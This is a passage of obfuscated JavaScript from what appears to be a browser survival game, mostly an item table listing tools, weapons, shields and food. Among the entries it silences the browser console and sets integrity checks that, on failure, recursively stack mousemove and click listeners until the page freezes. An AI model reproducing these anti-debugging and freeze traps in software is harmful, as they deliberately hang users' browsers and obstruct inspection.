		const Δⵠⵠⵠ = Δᐃⵠⵠ;
		const ⵠᐃⵠΔ = ⵠⲆΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⵠⲆⵠⲆ] = {
			name: "Book",
			"ᐃⵠ": Ⲇ.ⲆⵠᐃⲆⲆΔΔ,
			"ᐃᐃⲆⵠ": ⵠⲆᐃⵠ,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠΔⵠΔⲆ] = {
			name: "Paper",
			"ᐃⵠ": Ⲇ.ΔⵠⵠⵠᐃⲆⵠ,
			"ᐃᐃⲆⵠ": ᐃΔΔ,
			"ⵠⲆⵠΔ": ᐃΔΔ
		};
		const ⵠⲆᐃΔⲆᐃᐃ = ⵠΔⵠⲆᐃᐃⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠᐃᐃⵠ] = {
			name: "Bag",
			"ᐃⵠ": Ⲇ.ⵠⵠΔⲆⵠᐃᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⵠᐃⲆⲆ] = {
			name: "Amethyst sword",
			"ᐃⵠ": Ⲇ.ΔⲆⲆΔⲆⲆΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ⵠᐃⵠΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆⵠΔᐃ] = {
			name: "Amethyst pick",
			"ᐃⵠ": Ⲇ.ΔⵠⲆᐃⲆⵠΔ,
			"ᐃᐃⲆⵠ": ᐃⵠΔ,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⲆΔᐃΔ] = {
			name: "Amethyst spear",
			"ᐃⵠ": Ⲇ.ⵠᐃⲆΔⲆᐃΔ,
			"ᐃᐃⲆⵠ": ⵠΔⲆⵠ,
			"ⵠⲆⵠΔ": ⵠΔᐃ
		};
		const ΔⵠⲆΔⲆⲆᐃ = ⵠΔΔⵠⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠⲆΔⲆ] = {
			name: "Stone hammer",
			"ᐃⵠ": Ⲇ.ΔΔⲆⲆΔΔⲆ,
			"ᐃᐃⲆⵠ": Δⵠᐃ,
			"ⵠⲆⵠΔ": 1
		};
		const ⲆⲆⲆΔᐃ = ᐃᐃⲆⵠⵠ;
		const ΔΔⵠⵠ = ΔΔⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆᐃⵠΔⲆ] = {
			name: "Gold hammer",
			"ᐃⵠ": Ⲇ.ᐃᐃⲆⲆᐃᐃΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ⵠⲆΔ
		};
		const ⵠᐃΔΔᐃⲆⵠ = ⲆᐃΔⲆⵠ;
		const ⵠᐃⵠⲆΔ = ᐃᐃⵠⵠΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃᐃᐃⲆⵠ] = {
			name: "Diamond hammer",
			"ᐃⵠ": Ⲇ.ⵠⵠⲆᐃⵠⵠΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ᐃᐃⲆΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⵠⵠⲆⵠ] = {
			name: "Amethyst hammer",
			"ᐃⵠ": Ⲇ.ⵠᐃΔΔᐃΔᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ⲆⵠⲆⲆ
		};
		const ⲆⲆⲆᐃΔ = ᐃΔⲆΔᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔΔΔⵠΔ] = {
			name: "Reidite hammer",
			"ᐃⵠ": Ⲇ.ⵠⲆΔΔᐃΔΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": Ⲇᐃⵠ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃΔᐃΔⵠ] = {
			name: "Amethyst wall",
			"ᐃⵠ": Ⲇ.ⲆᐃⲆᐃΔⵠᐃ,
			"ᐃᐃⲆⵠ": ΔΔⵠ,
			"ⵠⲆⵠΔ": ᐃᐃⵠ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⲆⵠⵠᐃ] = {
			name: "Amethyst spike",
			"ᐃⵠ": Ⲇ.ⵠⲆⵠⲆᐃᐃⵠ,
			"ᐃᐃⲆⵠ": ᐃΔΔ,
			"ⵠⲆⵠΔ": 1
		};
		const ⵠⲆᐃⲆᐃΔⲆ = ⵠᐃⵠⵠⲆ;
		var ⲆΔᐃΔΔⲆⲆ = ᐃⲆᐃΔᐃⵠᐃ.console;
		ⲆΔᐃΔΔⲆⲆ.log = ⲆΔᐃΔΔⲆⲆ.info = ⲆΔᐃΔΔⲆⲆ.error = ⲆΔᐃΔΔⲆⲆ.warn = ⲆΔᐃΔΔⲆⲆ.debug = ⲆΔᐃΔΔⲆⲆ.ⵠΔⲆⵠⲆⲆⲆᐃΔ = ⲆΔᐃΔΔⲆⲆ.trace = ⲆΔᐃΔΔⲆⲆ.time = ⲆΔᐃΔΔⲆⲆ.timeEnd = function() {};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⲆⲆⲆⲆ] = {
			name: "Amethyst door",
			"ᐃⵠ": Ⲇ.ΔⵠΔⲆⲆᐃⵠ,
			"ᐃᐃⲆⵠ": ⵠⲆᐃⵠ,
			"ⵠⲆⵠΔ": ⵠⲆΔ
		};
		const ΔⲆΔΔ = ᐃⲆⵠⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⵠΔᐃⲆ] = {
			name: "Cap & scarf",
			"ᐃⵠ": Ⲇ.ⵠΔᐃⵠᐃⲆΔ,
			"ᐃᐃⲆⵠ": ⵠⲆᐃⵠ,
			"ⵠⲆⵠΔ": ⵠΔΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔΔΔΔᐃ] = {
			name: "Blue cord",
			"ᐃⵠ": Ⲇ.ⵠⲆⵠΔᐃᐃΔ,
			"ᐃᐃⲆⵠ": ᐃΔΔ,
			"ⵠⲆⵠΔ": ⲆΔⵠ
		};
		const ⲆᐃⲆⲆⲆΔᐃ = ⲆᐃᐃΔⵠⵠᐃ;
		const ᐃⲆᐃΔⵠ = ⵠⵠⵠⲆᐃ;
		const ⲆⵠⲆᐃⲆΔΔ = ⲆΔΔⲆΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔΔΔⵠᐃ] = {
			name: "Lock",
			"ᐃⵠ": Ⲇ.ᐃΔᐃᐃⲆⲆΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		const ΔᐃⵠΔᐃⲆΔΔΔ = ΔᐃᐃⲆⵠⲆⵠ;
		const Ⲇᐃᐃᐃⵠⵠⵠ = ⵠᐃⲆᐃᐃⵠᐃ;
		const ΔⲆΔⲆⲆᐃⲆ = ⲆⵠⵠⲆⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⵠᐃⲆⵠ] = {
			name: "Resurrection",
			"ᐃⵠ": Ⲇ.ⲆⲆⵠⵠⵠᐃᐃ,
			"ᐃᐃⲆⵠ": ΔΔⵠⵠ,
			"ⵠⲆⵠΔ": ᐃⲆᐃ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠΔⵠΔ] = {
			name: "Lockpick",
			"ᐃⵠ": Ⲇ.ⵠⵠⲆⵠΔΔⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		const ⵠΔᐃⲆᐃᐃⲆ = ᐃⵠᐃᐃⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆΔᐃⲆᐃ] = {
			name: ⵠ[534],
			"ᐃⵠ": Ⲇ.ΔⵠᐃᐃⲆΔⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ΔΔΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⵠΔⲆΔ] = {
			name: "Amethyst helmet",
			"ᐃⵠ": Ⲇ.ⵠⲆⵠⵠⵠᐃⲆ,
			"ᐃᐃⲆⵠ": ⵠⲆⲆ,
			"ⵠⲆⵠΔ": 1
		};
		const ⵠⲆᐃᐃΔᐃᐃ = ⲆⵠⵠⲆⲆ;
		const ᐃⵠᐃΔⵠ = ⵠᐃⲆⲆΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⵠⵠⵠᐃ] = {
			name: "Super hammer",
			"ᐃⵠ": Ⲇ.ᐃᐃⲆⵠΔⲆⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ΔΔΔ
		};
		const ᐃΔΔΔΔΔᐃⵠΔ = ⲆⲆⵠΔᐃΔΔ;
		const ⵠᐃᐃᐃᐃΔⵠ = ᐃΔᐃⲆΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⲆΔⲆᐃ] = {
			name: "Bridge",
			"ᐃⵠ": Ⲇ.ΔⲆΔⲆⲆⵠⵠ,
			"ᐃᐃⲆⵠ": ΔΔΔ,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⵠΔΔⵠ] = {
			name: "Wood Tower",
			"ᐃⵠ": Ⲇ.ΔᐃⵠⵠⲆᐃⵠ,
			"ᐃᐃⲆⵠ": 1,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆᐃᐃᐃ] = {
			name: "Bottle full",
			"ᐃⵠ": Ⲇ.ⵠΔⵠⵠⵠⲆᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ΔΔⵠⵠ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃᐃⲆⲆᐃ] = {
			name: "Bottle empty",
			"ᐃⵠ": Ⲇ.ⲆⲆᐃΔⵠΔⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": Δᐃᐃᐃ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠⵠΔᐃ] = {
			name: "Stone shovel",
			"ᐃⵠ": Ⲇ.ΔⵠⵠΔΔⲆⵠ,
			"ᐃᐃⲆⵠ": ΔΔⵠ,
			"ⵠⲆⵠΔ": Ⲇᐃⵠ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠᐃⲆᐃⵠ] = {
			name: "Watering can",
			"ᐃⵠ": Ⲇ.ⲆⲆⲆᐃᐃⵠᐃ,
			"ᐃᐃⲆⵠ": ᐃⵠΔ,
			"ⵠⲆⵠΔ": 0
		};
		const ᐃⵠᐃⵠΔⵠⵠⲆᐃ = ⵠΔⵠⲆᐃᐃⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⵠⲆΔⲆ] = {
			name: "Wheat",
			"ᐃⵠ": Ⲇ.ⵠᐃΔⵠⲆΔⵠ,
			"ᐃᐃⲆⵠ": ᐃⵠΔ,
			"ⵠⲆⵠΔ": 0
		};
		const ⲆⵠΔΔᐃᐃᐃ = ΔⵠⲆⵠᐃᐃΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠⲆᐃᐃ] = {
			name: "Cookie",
			"ᐃⵠ": Ⲇ.ⲆΔⵠΔⵠᐃⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔΔⲆᐃᐃ] = {
			name: "Windmill",
			"ᐃⵠ": Ⲇ.ΔⲆΔⲆᐃⵠⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠᐃΔⲆ] = {
			name: "Super diving suit",
			"ᐃⵠ": Ⲇ.ΔᐃⲆⵠΔⵠᐃ,
			"ᐃᐃⲆⵠ": ᐃⵠΔ,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⲆΔΔⵠ] = {
			name: "Diving mask",
			"ᐃⵠ": Ⲇ.ⵠΔⵠΔⵠΔⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		const ΔⵠΔⲆⲆⵠΔΔᐃ = ⲆᐃⵠᐃⲆⵠⲆ;
		const ⲆᐃⵠⲆⵠᐃⵠ = ⲆΔᐃΔⲆΔΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆⲆⵠⵠ] = {
			name: "Watering can full",
			"ᐃⵠ": Ⲇ.ΔΔⵠⲆⲆᐃⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		const ᐃΔⵠᐃⵠᐃⲆ = ᐃΔΔⲆΔ;
		const ᐃᐃᐃⲆⲆᐃⲆ = ΔᐃⵠⲆⲆ;
		const ᐃΔᐃΔᐃΔᐃ = ΔⵠΔᐃⵠ;
		const ⲆΔΔⵠΔᐃᐃⵠⲆ = ᐃⲆᐃᐃᐃⲆⵠ;
		const ⲆⲆΔⲆⵠᐃᐃ = ⵠⲆᐃᐃΔᐃᐃ;
		const ᐃⵠⵠᐃΔ = ⲆΔᐃⲆΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆΔΔⲆᐃ] = {
			name: "Cake",
			"ᐃⵠ": Ⲇ.ⵠᐃⵠΔΔΔΔ,
			"ᐃᐃⲆⵠ": Δⵠᐃ,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.Ⲇⵠᐃᐃⵠ] = {
			name: "Foodfish cooked",
			"ᐃⵠ": Ⲇ.ᐃⵠᐃⲆᐃΔⲆ,
			"ᐃᐃⲆⵠ": ⲆΔⵠ,
			"ⵠⲆⵠΔ": 0
		};
		const ⵠΔΔΔΔⵠⲆ = Δⵠᐃᐃⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠᐃΔⲆⲆ] = {
			name: "Plot",
			"ᐃⵠ": Ⲇ.ᐃΔⵠⵠⲆᐃΔ,
			"ᐃᐃⲆⵠ": 1,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆΔⵠΔⲆ] = {
			name: "Bread",
			"ᐃⵠ": Ⲇ.ΔⲆΔⵠⲆΔᐃ,
			"ᐃᐃⲆⵠ": ⲆΔⵠ,
			"ⵠⲆⵠΔ": ⲆΔⵠ
		};
		const ᐃⵠΔᐃᐃⵠⵠ = ⲆᐃⲆⲆΔⲆⲆ;
		const ΔᐃᐃⵠⲆⵠⲆᐃⵠ = ᐃⲆᐃᐃᐃⲆⵠ;
		const ⵠᐃΔⲆ = ΔΔᐃⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⲆΔⲆⵠⲆΔ] = {
			name: "Bottle full (with ice)",
			"ᐃⵠ": Ⲇ.ΔᐃᐃⵠΔⲆᐃᐃⵠ,
			"ᐃᐃⲆⵠ": ΔΔⵠⵠ,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⲆⲆⲆΔⵠᐃ] = {
			name: "Bottle full (with well)",
			"ᐃⵠ": Ⲇ.ᐃⵠⲆΔΔⲆᐃⲆΔ,
			"ᐃᐃⲆⵠ": ᐃⵠΔ,
			"ⵠⲆⵠΔ": ᐃⲆᐃ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔΔⲆⵠΔ] = {
			name: "Gold shovel",
			"ᐃⵠ": Ⲇ.ⲆⲆᐃⵠⲆΔᐃ,
			"ᐃᐃⲆⵠ": ΔΔⵠ,
			"ⵠⲆⵠΔ": Ⲇᐃⵠ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠᐃΔΔᐃ] = {
			name: "Diamond shovel",
			"ᐃⵠ": Ⲇ.ⲆᐃⲆΔⲆⲆΔ,
			"ᐃᐃⲆⵠ": ⲆΔⵠ,
			"ⵠⲆⵠΔ": 1
		};
		const ⲆⲆⲆⵠΔ = ⵠⵠⵠⲆᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠᐃᐃⲆΔ] = {
			name: "Amethyst shovel",
			"ᐃⵠ": Ⲇ.ⵠⵠᐃⵠᐃⲆᐃ,
			"ᐃᐃⲆⵠ": ⵠⲆᐃⵠ,
			"ⵠⲆⵠΔ": 1
		};
		const ⲆᐃⲆΔΔ = ⵠᐃΔⵠⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔΔᐃⲆΔ] = {
			name: "Spanner",
			"ᐃⵠ": Ⲇ.ᐃⵠᐃΔⵠⲆᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": Ⲇᐃⵠ
		};
		const ⵠⵠΔΔᐃⵠⲆ = ⵠΔⵠΔΔ;
		const ΔΔΔΔⲆⵠⲆ = Ⲇᐃᐃᐃᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔΔⵠᐃⵠ] = {
			name: "Machete",
			"ᐃⵠ": Ⲇ.ᐃΔΔⲆⲆᐃⲆ,
			"ᐃᐃⲆⵠ": ⵠⲆⲆ,
			"ⵠⲆⵠΔ": ΔΔΔ
		};
		const ᐃᐃⵠᐃᐃ = ᐃᐃⵠⵠΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⵠᐃⲆⵠ] = {
			name: "Bread oven",
			"ᐃⵠ": Ⲇ.ⵠΔⵠᐃⲆⲆⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": Ⲇᐃⵠ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠⲆⵠⵠ] = {
			name: ⵠ[239],
			"ᐃⵠ": Ⲇ.ΔⲆᐃᐃⵠΔΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠᐃⲆⲆⵠ] = {
			name: "Dragon helmet",
			"ᐃⵠ": Ⲇ.ᐃᐃⵠΔⵠⵠⵠ,
			"ᐃᐃⲆⵠ": ΔΔⵠ,
			"ⵠⲆⵠΔ": ⵠΔⲆⵠ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⵠᐃⵠΔ] = {
			name: "Dragon helmet",
			"ᐃⵠ": Ⲇ.ⵠⵠΔⲆΔⵠⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ΔΔⵠⵠ
		};
		const ⲆⵠⵠⵠΔⵠΔ = "";

		function ⵠΔᐃᐃΔ(ΔΔⲆᐃΔⲆᐃⲆⵠ) {
			if (ΔΔⲆᐃΔⲆᐃⲆⵠ > 0) return ΔΔⲆᐃΔⲆᐃⲆⵠ * ΔΔⲆᐃΔⲆᐃⲆⵠ;
			else return ΔΔⲆᐃΔⲆᐃⲆⵠ
		}

		function ⵠⲆΔᐃᐃⲆⲆ(ⲆⵠΔΔΔᐃⲆ) {
			return ᐃⲆᐃΔᐃⵠᐃ.String.fromCharCode(ⲆⵠΔΔΔᐃⲆ)
		}

		function ⲆⲆΔᐃⲆⲆⲆⵠⵠ(ᐃⵠᐃⲆΔΔⵠ) {
			return ᐃⵠᐃⲆΔΔⵠ.map(ⵠⲆΔᐃᐃⲆⲆ).join(ⲆⵠⵠⵠΔⵠΔ)
		}

		function ΔⵠᐃᐃⵠᐃⲆⵠⵠ(ᐃⲆⲆΔⲆΔΔⵠⲆ) {
			const ΔᐃⲆᐃⵠⲆᐃ = ⵠΔᐃᐃΔ[ΔᐃⲆⵠⲆⵠΔ[31]]();
			const ⲆΔΔⲆⵠΔᐃ = ΔᐃⲆᐃⵠⲆᐃ.indexOf(ᐃⲆⲆΔⲆΔΔⵠⲆ);
			return ⲆΔΔⲆⵠΔᐃ !== -1 ? 1 : 0
		}
		const ⲆⲆⵠⵠΔ = ΔⵠᐃᐃⵠᐃⲆⵠⵠ(ⲆⲆΔᐃⲆⲆⲆⵠⵠ([11616, 916, 5123, 5123, 916]));
		if (ⲆⲆⵠⵠΔ === 0) {
			const ⲆⲆⵠⵠΔ = function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]]("mousemove", (function() {
					ⲆⲆⵠⵠΔ()
				}))
			};
			ⲆⲆⵠⵠΔ()
		}
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆᐃⲆΔⵠ] = {
			name: "Witch",
			"ᐃⵠ": Ⲇ.ᐃⲆᐃⵠᐃΔⵠ,
			"ᐃᐃⲆⵠ": ᐃⵠΔ,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆᐃᐃⵠⲆ] = {
			name: "Nimbus",
			"ᐃⵠ": Ⲇ.ⲆΔΔⵠⵠΔⵠ,
			"ᐃᐃⲆⵠ": ⵠⲆᐃⵠ,
			"ⵠⲆⵠΔ": ⵠⲆⲆ
		};
		const ⵠⵠⵠⵠ = ΔᐃⲆΔ;
		const ᐃᐃⲆΔΔⲆᐃ = ΔⵠᐃΔⵠ;
		const ⵠⲆⲆΔΔ = ⲆⵠⵠⲆΔ;
		const ᐃⵠⲆΔⲆᐃⲆ = ΔⲆᐃᐃⲆⵠᐃ;
		const ᐃΔᐃⲆ = ⵠΔᐃ;
		const ⲆΔⲆᐃΔⲆᐃ = ᐃᐃᐃⵠⵠ;
		const ᐃⲆⲆΔΔⲆᐃ = ⵠⲆⲆⲆᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠΔⲆⵠΔ] = {
			name: "Wand1",
			"ᐃⵠ": Ⲇ.ⲆⲆᐃΔⲆⲆΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ᐃⵠⲆ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠᐃⵠⲆ] = {
			name: "Wand2",
			"ᐃⵠ": Ⲇ.ᐃᐃⲆⵠⲆΔⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		const ⵠΔΔᐃΔ = ⵠΔᐃΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⲆⲆᐃⲆ] = {
			name: "Dragon sword",
			"ᐃⵠ": Ⲇ.ⵠⲆᐃⵠΔᐃᐃ,
			"ᐃᐃⲆⵠ": Δᐃᐃᐃ,
			"ⵠⲆⵠΔ": ΔⲆⲆ
		};
		const ⵠΔΔⲆΔΔΔ = Δⵠᐃⵠⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆⵠⲆᐃ] = {
			name: "Dragon sword",
			"ᐃⵠ": Ⲇ.ΔⵠΔⲆᐃᐃⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		const ΔᐃΔᐃⲆΔΔ = ᐃⵠᐃᐃⲆ;
		const ΔΔᐃΔ = ᐃⲆᐃᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆⲆⲆΔ] = {
			name: "Wood shield",
			"ᐃⵠ": Ⲇ.ΔⵠⲆᐃⵠⵠⵠ,
			"ᐃᐃⲆⵠ": Δᐃᐃᐃ,
			"ⵠⲆⵠΔ": ⲆⵠⲆⲆ
		};
		const ⵠⲆΔΔΔⲆΔ = 7278471;

		function ᐃⵠⵠⲆ(ᐃⵠⲆⵠᐃᐃⵠ) {
			return ᐃⲆᐃΔᐃⵠᐃ.String.fromCharCode(ᐃⵠⲆⵠᐃᐃⵠ)
		}

		function ΔⵠⵠΔⲆⲆⵠ(ΔᐃⵠΔΔᐃΔ) {
			return ΔᐃⵠΔΔᐃΔ.map(ᐃⵠⵠⲆ).join("")
		}
		const ⲆᐃⲆΔᐃᐃⵠ = function() {
			const ⵠΔⲆⵠΔΔⵠ = ΔⵠⵠΔⲆⲆⵠ([11616, 11398, 916, 916, 916, 11398, 916]);
			const ⵠᐃⲆⵠ = {
				"ᐃⲆΔΔ": 1106086,
				"Ⲇⵠᐃⵠ": 4976302,
				"ⵠⲆΔΔΔⲆΔ": 15133748,
				"ⲆⵠᐃᐃΔᐃΔⵠΔ": 4080896
			};
			if (ⵠᐃⲆⵠ[ⵠΔⲆⵠΔΔⵠ] !== ⵠᐃⲆⵠ.ⵠⲆΔΔΔⲆΔ) {
				const ⵠⲆΔΔΔⲆΔ = function() {
					for (let ᐃⵠⵠⲆ = 0; ᐃⵠⵠⲆ < 5; ᐃⵠⵠⲆ++) ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]]("click", (function() {
						ⵠⲆΔΔΔⲆΔ()
					}))
				};
				ⵠⲆΔΔΔⲆΔ()
			}
		};
		ⲆᐃⲆΔᐃᐃⵠ();
		ⲆⲆⵠᐃ[ᐃᐃ.ΔᐃⵠΔⲆ] = {
			name: "Stone shield",
			"ᐃⵠ": Ⲇ.ⵠΔΔⵠⵠⵠⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ᐃⲆᐃ
		};
		const ΔⲆⵠⲆ = ⲆΔⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆΔⲆⵠⵠ] = {
			name: "Gold shield",
			"ᐃⵠ": Ⲇ.ΔΔᐃⵠΔⲆⵠ,
			"ᐃᐃⲆⵠ": ᐃⵠΔ,
			"ⵠⲆⵠΔ": ᐃᐃⲆΔ
		};
		const ⵠⲆΔⵠᐃ = ⵠⵠⲆⵠΔ;
		const ⲆᐃΔⲆⲆ = ᐃⵠΔᐃΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆᐃⵠᐃⲆ] = {
			name: "Diamond shield",
			"ᐃⵠ": Ⲇ.ⲆΔΔΔⲆᐃᐃ,
			"ᐃᐃⲆⵠ": Δⵠᐃ,
			"ⵠⲆⵠΔ": 1
		};
		const ΔⵠⲆᐃΔ = ⲆᐃΔⲆᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⵠⵠΔᐃ] = {
			name: "Amethyst shield",
			"ᐃⵠ": Ⲇ.ⲆⵠΔⲆⲆⵠΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ᐃᐃⵠ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃᐃᐃⵠΔ] = {
			name: "Reidite shield",
			"ᐃⵠ": Ⲇ.ΔⵠⵠⲆⲆⲆⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		const ΔⲆΔΔΔ = Δᐃⵠⵠ;
		const ⲆⵠᐃΔᐃⵠᐃ = ⲆᐃΔᐃⵠⵠⵠ;
		const ᐃⲆᐃⲆⲆᐃᐃ = ⲆⵠΔⵠⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆᐃⵠⵠΔ] = {
			name: "Wood axe",
			"ᐃⵠ": Ⲇ.ΔᐃΔΔΔⵠⵠ,
			"ᐃᐃⲆⵠ": ΔⲆⲆ,
			"ⵠⲆⵠΔ": ⵠΔΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆΔΔⵠⵠ] = {
			name: "Stone axe",
			"ᐃⵠ": Ⲇ.ΔⲆᐃⲆΔᐃᐃ,
			"ᐃᐃⲆⵠ": ⵠⲆᐃⵠ,
			"ⵠⲆⵠΔ": ⵠΔΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠΔⲆΔΔ] = {
			name: "Gold axe",
			"ᐃⵠ": Ⲇ.ΔᐃⲆᐃⲆΔᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆᐃⵠᐃ] = {
			name: "Diamond axe",
			"ᐃⵠ": Ⲇ.ⵠᐃΔΔΔΔⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ⵠᐃⵠΔ
		};
		const ΔΔⵠⲆΔ = ⵠΔⲆⲆⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔΔⵠⵠⲆ] = {
			name: "Amethyst axe",
			"ᐃⵠ": Ⲇ.ᐃΔⵠᐃⵠⲆᐃ,
			"ᐃᐃⲆⵠ": ᐃΔΔ,
			"ⵠⲆⵠΔ": ΔΔΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⲆᐃⵠⲆ] = {
			name: "Reidite axe",
			"ᐃⵠ": Ⲇ.ⲆᐃⲆⲆᐃⵠᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ᐃⲆᐃ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠᐃΔⲆⵠ] = {
			name: "Wood bow",
			"ᐃⵠ": Ⲇ.ⲆᐃⵠᐃⵠΔΔ,
			"ᐃᐃⲆⵠ": ⵠΔⲆⵠ,
			"ⵠⲆⵠΔ": 1
		};
		const ᐃⵠⵠⵠⲆ = ⲆⲆᐃᐃⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃΔⲆᐃΔ] = {
			name: "Stone bow",
			"ᐃⵠ": Ⲇ.ⵠⵠΔⵠᐃΔⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		const ΔⲆⵠⵠᐃⲆΔ = ΔΔᐃᐃΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⲆⵠⲆⵠ] = {
			name: "Gold bow",
			"ᐃⵠ": Ⲇ.ⵠΔⵠΔΔᐃⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
